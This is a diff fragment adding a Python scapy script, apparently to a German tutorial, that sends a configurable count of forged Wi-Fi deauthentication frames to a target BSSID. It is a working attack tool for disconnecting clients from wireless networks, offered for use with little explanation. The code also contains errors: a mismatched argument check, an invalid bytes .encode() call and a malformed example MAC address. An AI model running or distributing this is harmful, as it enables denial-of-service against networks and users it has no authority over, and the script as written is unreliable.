@@ -21,3 +21,26 @@ Example (mit Modul "random"):
 
 Script mit Modul "random":
 
+
+    from scapy.all import *
+    import sys,random
+    from colorama import *
+
+    init()
+    if (len(sys.argv) < 3):
+        print(" ")
+        print(" ")
+        print("[!] I need the target BSSID, COUNTER and the Size of the Message!")
+        print(" ")
+        print(" ")
+        print("[*] Example: python deauth.py aa:1V:3C:dd:ee:ff 1000 44")
+        print(" ")
+        quit()
+    size = sys.argv[3]
+    brdmac = "aa:bb:cc:dd:ee:ff"
+    pkg = random._urandom(int(size))
+    msg = pkg.encode()
+    packet = (RadioTap()/Dot11(addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/Dot11Deauth()
+            /(msg))
+    print(Fore.YELLOW)
+    sendp(packet,count=int(sys.argv[2]))
